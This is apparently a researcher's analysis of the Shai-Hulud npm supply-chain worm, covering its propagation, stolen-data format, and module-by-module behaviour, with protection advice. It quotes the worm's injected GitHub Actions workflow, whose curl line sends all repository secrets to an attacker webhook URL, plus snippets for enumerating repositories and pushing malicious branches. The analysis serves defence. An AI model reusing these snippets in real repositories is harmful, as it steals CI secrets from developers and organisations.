# Shai-Hulud Thoughts and Analysis
September 18, 2025

On 2025-09-15 the internet saw the first evidence of the Shai-Hulud worm spreading through NPM packages. By now there are many articles about this recent attack circulating from established security research firms and individuals. I wanted to take some time to publish some information that I found during my time analyzing the attack that I have not seen in other articles I have been reading.

For those interested, I would recommend reading through Charlie Eriksen's [Bugs in Shai-Hulud: Debugging the Desert](https://www.aikido.dev/blog/bugs-in-shai-hulud-debugging-the-desert). It goes over some really fascinating bugs that were discovered in the malware code including attack timelines. Overall, it provides a unique perspective that I didn't think we would get. I hope to build on that unique perspective with this write-up.

### Initial Observations:
1. There are over 100 modules in this variant of the malicious code.
    - See the Module Analysis section below for more information.
2. The malware utilized the /tmp directory to silently run helper scripts in the background in separate threads.
3. This malware appears to have been written with the help of, or 100% by, AI as there is frequent repetitive code AND formatted human-readable outputs in a malware script that is not intended to be read by humans.
    - There is also evidence of symbols / emojis in output which is a telltale sign of AI writing at least some of the code (see screenshot below).

    ![shai-hulud-bash-symbols](/images/shai-hulud-bash-symbols.png)
4. The main method to exfiltrate data was a hard-coded [webhook.site](https://docs.webhook.site/) URL. Webhook.site gives users a free, unique, random URL and e-mail address. Everything that's sent to these addresses are shown instantly. With this address, users can test and debug webhooks and HTTP requests. But this webhook can be easily taken down and is not persistent unless a higher tier of service is paid for. This struck me as strange given the amount of effort that was put into the propogation of the worm itself.
5. The overall code structure is extremely nested and loops over itself unnecessarily (functions calling other functions calling other functions).

### Primary Payload:
The core malicious payload in this variant of the analyzed malware is a GitHub Actions workflow injection attack that steals all repository secrets. The attack vector includes:
- **Target:** GitHub repositories and their CI/CD pipelines.
- **Method:** Automated branch creation and malicious workflow injection.
- **Scope:** Mass deployment across all accessible repositories via compromised npm package versions.

This malware utilizes [trufflehog](https://github.com/trufflesecurity/trufflehog), a popular secrets Discovery, Classification, Validation, and Analysis tool, to find and validate secrets within a compromised repository. The main payload is essentially a supply chain worm that uses legitimate GitHub Actions infrastructure to self-propagate and harvest secrets at massive scale across development environments.

### Attack Execution Flow:
The attack itself was fairly complex, requiring the compromise of over a hundred popular npm packages. This supply-chain style attack puts the infected npm packages onto various victim development systems that contain sensitive API tokens.

- **Initial Compromise:** The attackers likely used NPM tokens stolen from previous attacks. This allowed the attackers to compromise popular npm packages and propogate the spread of the shai-hulud worm.
- **Initial GitHub Compromise:** Malware gains access to GitHub Personal Access Token (PAT) by unknowing developers pulling down the malicious npm packages and running the malware.
- **Repository Discovery:** The malware enumerates all accessible repositories via GitHub API.
- **Branch Injection:** The malware creates a new branch named "shai-hulud" in each compromised repository.
- **Workflow Installation:** The malware uploads malicious GitHub Actions workflow.
- **Automatic Triggering:** The workflow executes on any push to the repository.
- **Secret Harvesting:** Captures all GitHub Secrets and environment variables.
- **Data Transmission:** Sends encoded secrets to attacker-controlled webhook.

There was also another aspect of this attack, information gathering. I witnessed several instances where compromised local development environments were fingerprinted. The malware collected system metadata and environment details and identified application configurations. This additional metadata about the development environment was bundled up along with the compromised secrets and published to a file called "data.json" in a public version of the victim repository and the hardcoded webhook URL (for a short period of time before it was taken down).

Despite the fact that the webhook url was taken down this attack still publishes captured data to publicly accessible GitHub repositories. Anyone, including the attackers, can scrape GitHub looking for these repositories.

### Example of Compromise:
I found several examples of users who were compromised by this shai-hulud malware. Below are some screenshots that show what a compromised repo looked like. You will notice that a commit with the name "Shai-Hulud" can be seen in the recent commit history.

![compromised-git-account](/images/compromised-git-account.png)

Here is what the file containing the base64 encoded data looked like.

![shai-hulud-compromised-data](/images/shai-hulud-compromised-data.png)

I also noticed some clever folks trying to troll the attackers by placing a file containing base64 encoded data in the same path that the real attack would. The data was a variety of funny YouTube videos.

![shai-hulud-trolls](/images/shai-hulud-trolls.png)

I also wanted to share the structure of the data that would have been base64 encoded twice and stored in the victim repo under `/data.json`. I have redacted the sensitive information. As you can see there was a large amount of information other than compromised cloud and GitHub credentials that was gathered.

```json
{
  "system": {
    "platform": "mac",
    "architecture": "arm64",
    "platformDetailed": "darwin",
    "architectureDetailed": "arm64"
  },
  "environment": {
    "NVM_INC": "/Users/REDACTED/.nvm/versions/node/v24.7.0/include/node",
    "TERM_PROGRAM": "vscode",
    "NODE": "/Users/REDACTED/.nvm/versions/node/v24.7.0/bin/node",
    "NVM_CD_FLAGS": "-q",
    "INIT_CWD": "/Users/REDACTED/Work/REDACTED/docs",
    "SHELL": "/bin/zsh",
    "TERM": "xterm-256color",
    "TMPDIR": "/var/folders/kd/33gmk4r12k14b5d4_2r499cr0000gn/T/",
    "HOMEBREW_REPOSITORY": "/opt/homebrew",
    "PROTO_HOME": "/Users/REDACTED/.proto",
    "npm_config_global_prefix": "/Users/REDACTED/.nvm/versions/node/v24.7.0",
    "TERM_PROGRAM_VERSION": "1.6.22",
    "MallocNanoZone": "0",
    "ORIGINAL_XDG_CURRENT_DESKTOP": "undefined",
    "CURSOR_TRACE_ID": "83ca71605ce340068ec42975adee9d0b",
    "ZDOTDIR": "/Users/REDACTED",
    "npm_package_optional": "",
    "COLOR": "1",
    "npm_config_noproxy": "",
    "ZSH": "/Users/REDACTED/.oh-my-zsh",
    "ENABLE_IDE_INTEGRATION": "true",
    "npm_config_local_prefix": "/Users/REDACTED/Work/REDACTED/docs",
    "USER": "REDACTED",
    "NVM_DIR": "/Users/REDACTED/.nvm",
    "LS_COLORS": "di=1;36:ln=35:so=32:pi=33:ex=31:bd=34;46:cd=34;43:su=30;41:sg=30;46:tw=30;42:ow=30;43",
    "COMMAND_MODE": "unix2003",
    "HOMEBREW_NO_ANALYTICS": "1",
    "npm_config_globalconfig": "/Users/REDACTED/.nvm/versions/node/v24.7.0/etc/npmrc",
    "npm_package_peer": "",
    "SSH_AUTH_SOCK": "/private/tmp/com.apple.launchd.hHSoBPijLI/Listeners",
    "CLAUDE_CODE_SSE_PORT": "53092",
    "__CF_USER_TEXT_ENCODING": "0x1F5:0x0:0x52",
    "VSCODE_PROFILE_INITIALIZED": "1",
    "npm_execpath": "/Users/REDACTED/.nvm/versions/node/v24.7.0/lib/node_modules/npm/bin/npm-cli.js",
    "PAGER": "less",
    "npm_package_integrity": "sha512-/iXVw7t9Xh/+OVWdthlGkDw0qPXKp4SDm6axo36o/opLzBj0ddG0EsMKR5S3mU9fwxlKHKdHUUWfgEaovw8W/A==",
    "LSCOLORS": "Gxfxcxdxbxegedabagacad",
    "PATH": "REDACTING LOCAL PATHS FROM COMPROMISED LOCAL SYSTEM",
    "npm_package_json": "/Users/REDACTED/Work/REDACTED/docs/node_modules/@ctrl/tinycolor/package.json",
    "__CFBundleIdentifier": "com.todesktop.230313mzl4w4u92",
    "USER_ZDOTDIR": "/Users/REDACTED",
    "npm_config_init_module": "/Users/REDACTED/.npm-init.js",
    "npm_config_userconfig": "/Users/REDACTED/.npmrc",
    "PWD": "/Users/REDACTED/Work/REDACTED/docs/node_modules/@ctrl/tinycolor",
    "npm_command": "install",
    "EDITOR": "vi",
    "npm_lifecycle_event": "postinstall",
    "LANG": "en_US.UTF-8",
    "npm_package_name": "@ctrl/tinycolor",
    "ADBLOCK": "1",
    "XPC_FLAGS": "0x0",
    "VSCODE_GIT_ASKPASS_EXTRA_ARGS": "",
    "npm_config_npm_version": "11.5.1",
    "NODE_ENV": "development",
    "npm_package_engines_node": ">=14",
    "npm_package_dev": "",
    "npm_config_node_gyp": "/Users/REDACTED/.nvm/versions/node/v24.7.0/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js",
    "XPC_SERVICE_NAME": "0",
    "npm_package_version": "4.1.2",
    "VSCODE_INJECTION": "1",
    "npm_package_resolved": "https://registry.npmjs.org/@ctrl/tinycolor/-/tinycolor-4.1.2.tgz",
    "HOME": "/Users/REDACTED",
    "SHLVL": "3",
    "VSCODE_GIT_ASKPASS_MAIN": "/Applications/Cursor.app/Contents/Resources/app/extensions/git/dist/askpass-main.js",
    "npm_config_save_exact": "true",
    "HOMEBREW_PREFIX": "/opt/homebrew",
    "npm_package_dev_optional": "",
    "LOGNAME": "REDACTED",
    "LESS": "-R",
    "npm_config_cache": "/Users/REDACTED/.npm",
    "npm_lifecycle_script": "node bundle.js",
    "VSCODE_GIT_IPC_HANDLE": "/var/folders/kd/33gmk4r12k14b5d4_2r499cr0000gn/T/vscode-git-735160d418.sock",
    "NVM_BIN": "/Users/REDACTED/.nvm/versions/node/v24.7.0/bin",
    "npm_config_user_agent": "npm/11.5.1 node/v24.7.0 darwin arm64 workspaces/false",
    "HOMEBREW_CELLAR": "/opt/homebrew/Cellar",
    "INFOPATH": "/opt/homebrew/share/info:/opt/homebrew/share/info:",
    "GIT_ASKPASS": "/Applications/Cursor.app/Contents/Resources/app/extensions/git/dist/askpass.sh",
    "VSCODE_GIT_ASKPASS_NODE": "/Applications/Cursor.app/Contents/Frameworks/Cursor Helper (Plugin).app/Contents/MacOS/Cursor Helper (Plugin)",
    "DISABLE_OPENCOLLECTIVE": "1",
    "COLORTERM": "truecolor",
    "npm_config_prefix": "/Users/REDACTED/.nvm/versions/node/v24.7.0",
    "npm_node_execpath": "/Users/REDACTED/.nvm/versions/node/v24.7.0/bin/node"
  },
  "modules": {
    "github": {
      "authenticated": true,
      "token": "REDACTED",
      "username": {}
    },
    "aws": {
      "secrets": [
        {
          "name": "redshift-serveless-access",
          "secretString": "{\"username\":\"REDACTED\",\"password\":\"REDACTED\",\"dbname\":\"REDACTED\",\"host\":\"REDACTED",\"port\":REDACTED,\"namespaceName\":\"REDACTED",\"engine\":\"redshift\"}",
          "versionId": "c7223a4c-e559-45b0-8842-3378bb7c204e"
        },
        {
          "name": "sqlworkbench!27a3be29-634a-478d-8c92-4e87999ad175",
          "secretString": "{\"engine\":\"redshift\",\"username\":\"REDACTED\",\"password\":\"REDACTED",\"dbName\":\"REDACTED",\"dbClusterIdentifier\":\"REDACTED",\"port\":REDACTED}",
          "versionId": "0f3a0bfc-4b31-41c1-8112-cee911c6dc75"
        }
      ]
    },
    "gcp": {
      "secrets": []
    },
    "truffleHog": {
      "available": true,
      "installed": true,
      "version": null,
      "platform": {
        "platform": "darwin",
        "architecture": "arm64"
      }
    },
      "results": {
        "success": false,
        "output": "{TONS OF STUFF REDACTED THAT WAS FOUND BY TRUFFLEHOG.}
    },
    "npm": {
      "authenticated": false,
      "username": null
    }
}
```

## How I got a sample of the Shai-Hulud Malware:
Immediatly upon hearing the news that Shai-Hulud was propagating through popular npm packages, I decided to pull one down to a Docker container I spun up.

![compromised-shai-hulud-package](/images/compromised-shai-hulud-package.png)

I unpacked the compromised npm package and found the malicious code stored in bundle.json.

![shai-hulud-bundle](/images/shai-hulud-bundle.png)

A screenshot of some of the code can be seen below. The file was over 100,000 lines!

![shai-hulud-code](/images/shai-hulud-code.png)

## Module Analysis:
I took a deep look at some of the modules that I found interesting. Modules 941, 1072, and 1254 were particually interesting. Module 941 is where the attack payload lives. Below is my analysis.

### Core HTTP & Network Modules:

**Module 1: HTTP Redirect Handler** - Checks if HTTP status codes (301, 302, 303, 307, 308) are redirects.

**Module 50: AWS Web Identity Credentials** - Validates web identity profiles and resolves credentials from web identity tokens.

**Module 71: AWS STS Client** - Complete Security Token Service client with middleware stack for authentication and token management.

**Module 82: IP Resolver** - Handles IPv4/IPv6 address resolution for gRPC connections with endpoint validation
Data Serialization & Utilities (100-200).

**Module 140: CBOR Support** - Provides Concise Binary Object Representation encoding/decoding with buffer allocation utilities.

**Module 173: S3 Bucket Validation** - Validates S3 bucket names for virtual hosting compatibility and DNS compliance
AWS Service Protocol Modules (200-1000).

**Module 218: AWS Secrets Manager Protocol** - Serialization/deserialization for all Secrets Manager API operations (BatchGetSecretValue, CreateSecret, etc.).

**Module 300: XML Deserializer** - Implements an XML Shape Deserializer that processes and parses XML data structures for AWS API responses.

**Module 463: gRPC connectivity state manager** - This module defines and exports a gRPC connectivity state enumeration that tracks the connection status of network communications.

**Module 565: Fetch Error Handler** - Defines a custom error class that extends a base fetch error to provide enhanced error handling for network requests.

**Module 651: Default retry token generator** - This module creates retry tokens that manage the retry logic for failed operations, implementing exponential backoff and retry limits.

**Module 767: AWS login logic** - This module provides complete serialization and deserialization for AWS SSO API operations, handling authentication, role management, and credential retrieval.

**Module 772: Login resolution manager** - This module resolves authentication logins by processing both static and dynamic authentication tokens from multiple identity providers.

**Module 883: AWS Endpoint Functions caller** - This module aggregates and registers AWS-specific endpoint utility functions that handle service discovery, ARN parsing, and partition management.

Several other helper functions are called from this function:

```javascript
var F = n(7069),      // Core endpoint functions registry
    te = n(75481),    // S3 bucket validation utilities  
    re = n(72696),    // ARN parsing utilities
    ne = n(66730);    // AWS partition utilities
```

**Module 909: AWS Signature Auth** - This module aggregates and exports AWS signature authentication components used to sign API requests to AWS services using various signature versions.

Several other helper functions are called from this function:

```javascript
var F = n(77113),     // Core SigV4 signing utilities
    te = n(21006),    // SigV4A (multi-region) signing
    re = n(88157),    // Authentication scheme preferences  
    ne = n(1942),     // SigV4A configuration options
    oe = n(25669);    // SigV4 configuration resolvers
```

This module works with:
- Module 463 (Process access) → Steals environment credentials
- Module 772 (Login resolution) → Harvests federated tokens
- Module 909 (this module) → Signs malicious API requests
- Network modules → Sends authenticated requests to AWS

**Module 932: Node.js Process Object Access** - This module exports the Node.js process global object through Webpack's external module system, providing complete access to the runtime environment.
- Webpack is primarily known as a module bundler for client-side JavaScript applications.
- You can configure Webpack to bundle your Node.js application's server-side code into one or more files.

**Module 941: GitHub Secret Harvesting Script** - This module contains a complete bash script that infiltrates GitHub repositories and steals all repository secrets by creating malicious GitHub Actions workflows.

Authentication and variable Setup:

```yaml
GITHUB_TOKEN="$1"
API_BASE="https://api.github.com"
BRANCH_NAME="shai-hulud" FILE_NAME=".github/workflows/shai-hulud-workflow.yml"
Attack Payload:
on:
  push:
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
    - name: Data Processing
      run: curl -d "$CONTENTS" https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7; echo "$CONTENTS" | base64 -w 0 | base64 -w 0
      env:
        CONTENTS: ${{ toJSON(secrets) }}
```

The endpoint that the attackers were trying to exfiltrate data to was "hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7". This link was promptly shut down. It is unclear whether any data was sucessfully exfiltrated using this link.

**GitHub attack flow:**

Token validation
```bash
# Check for required scopes
if [[ ! "$SCOPES" =~ "repo" ]]; then
    echo "❌ Error: Token missing 'repo' scope"
    exit 1
fi

if [[ ! "$SCOPES" =~ "workflow" ]]; then
    echo "❌ Error: Token missing 'workflow' scope"  
    exit 1
fi
```

Repository Discovery

```bash
# List repositories with filters
REPOS_RESPONSE=$(github_api GET "/user/repos?affiliation=owner,collaborator,organization_member&since=2025-01-01T00:00:00Z&per_page=100")
```
- Targets repositories the user has access to.
- Includes owned, collaborated, and organization repositories.
- Focuses on recently updated repositories (since 2025). The “member” and “since” references in the code snippet above correspond to the behavior of this malware that I have seen in the wild where a vast majority of the compromised git repositories were being created by very new users.

Branch Creation

```bash
# Create new branch
BRANCH_DATA=$(jq -n \
    --arg ref "refs/heads/$BRANCH_NAME" \
    --arg sha "$BASE_SHA" \
    '{ref: $ref, sha: $sha}')
```
- Creates a new branch named "shai-hulud"
- Based on the default branch.

Malicious Workflow Injection

```bash
# Upload file to the new branch
FILE_DATA=$(jq -n \
   --arg message "Add $FILE_NAME placeholder file" \
   --arg content "$FILE_CONTENT_BASE64" \
   --arg branch "$BRANCH_NAME" \
   '{message: $message, content: $content, branch: $branch}')
```
- Uploads the malicious workflow file.
- Uses innocuous commit message.
- Base64 encodes the malicious content.

### Authentication & Security Modules

**Module 1072: AWS Role assumption with web identity** - implements the AWS STS AssumeRoleWithWebIdentity command which allows the malware to assume AWS IAM roles using web identity tokens (OAuth, OIDC) for privilege escalation and persistent access.
- Assume any AWS IAM role that trusts web identity providers.
- Escalate privileges beyond the initial compromised credentials.
- Gain cross-account access to different AWS accounts and can potentially abuse tokens from other providers like Google. 
- Obtain temporary credentials with broader permissions.
- This module calls several other modules.

```javascript
var F = n(72540),    // Endpoint plugin
    te = n(32754),   // Serialization plugin  
    re = n(31796),   // Base Command class
    ne = n(77927),   // Common parameters
    oe = n(94942),   // Request/response filters
    ie = n(66816);   // Serialization/deserialization
```

**Module 1131: AWS STS Client Implementation** - This module creates a fully-featured AWS STS client that can perform all AWS Security Token Service operations including credential theft, role assumption, and token manipulation.
- Several other modules are called from this module:

```javascript
var F = n(81095),    // Host header configuration
    te = n(50165),   // Logger plugin
    re = n(30170),   // Recursion detection
    ne = n(44130),   // User agent configuration
    oe = n(61329),   // Region configuration
    ie = n(40033),   // HTTP authentication schemes
    se = n(70649),   // Content length plugin
    ae = n(72540),   // Endpoint configuration
    ce = n(41069),   // Retry configuration
    le = n(31796),   // Base client class
    ue = n(41547),   // HTTP auth scheme configuration
    de = n(7339),    // Client endpoint parameters
    pe = n(64194),   // Runtime configuration
    ge = n(53102);   // Runtime extensions
```
- The client can perform all available AWS STS commands:
    - AssumeRole - Escalate privileges by assuming IAM roles
    - AssumeRoleWithWebIdentity - Use stolen OAuth tokens for access
    - AssumeRoleWithSAML - Abuse SAML assertions
    - GetSessionToken - Obtain temporary credentials
    - GetFederationToken - Create federated user sessions
    - DecodeAuthorizationMessage - Decode AWS policy denials
- This STS client can use credentials from:
    - Module 463/932 - Process environment variables
    - Module 772 - Federated login tokens
    - Module 50 - Web identity credentials
    - Previous STS operations - Escalated role credentials

**Module 1238: Protocol Buffers Loader** - This module provides protobuf schema loading and resolution capabilities, enabling the malware to communicate using Google's Protocol Buffers format for efficient, structured data exchange.
- This module calls several other modules:

```javascript
const F = n(79896),    // File system access
      te = n(16928),   // Path utilities  
      re = n(52549);   // Protocol Buffers Root

const t = n(15434),  // API protos
r = n(93951),  // Descriptor protos 
F = n(92939),  // Source context protos  
te = n(36710); // Type protos
```
- This module enables the malware to:
    - Communicate with C&C servers using efficient binary protocols.
    - Exchange structured data with remote handlers.
    - Parse complex message formats from external sources.

**Module 1254: AWS SDK User Agent App ID Configuration** - This module configures User Agent application identifiers that AWS uses to track and identify SDK usage, which the malware can manipulate for stealth and evasion.
- Module attack chain:
  1. Module 463/932 (Process Access) - (Harvests environment variables)
  2. Module 1254 (UA Config) - (Configures identity sources)
  3. Module 44683 (Intermediate Handler) - (Processes configuration)
  4. Module 46624 (Identity Resolver) - (Uses victim's own identity)
  5. STS Client (Module 1131) - (Makes requests with stolen identity)
  6. AWS APIs (Credential theft with camouflage)

- Detection Evasion
    - Blends with enterprise traffic using corporate app identifiers in CloudTrail logs.
        - Module 1254 is used by Module 44863 to set user agent headers to appear as legitimate AWS console traffic (looking at “DEFAULT_UA_APP_ID”). Module 44863 then looks to module 46624.
        - Module 46624 creates the app ID from legitimate config files that were previously set up by the victim to mimic the victim.
    - Avoids anomaly detection by using expected User Agent patterns.

# How to Protect Youself:
1. Look through npm dependencies in your project and verify whether any of them were compromised.

2. Utilize an npm security scanner to detect compromised npm packages and malicious code patterns (by either spot checking or integrating the scanner in a CI/CD pipeline).
    - I found [this one by arif-dewi](https://github.com/arif-dewi/npm-security-scanner) on GitHub.

# Final Thoughts:
This was a sophisticated attack that suffered from some fundamental flaws. Those flaws utlimately led to security researchers and personnel at the ground level gaining a firm understanding of how to counter Shai-Hulud. However, this is not the end of this desert network worm. I believe this it will continue to burn those who are not paying attention. And if we are not vigilant, it is only a matter of time before this style of supply-chain attack hits the next package manager we all rely on.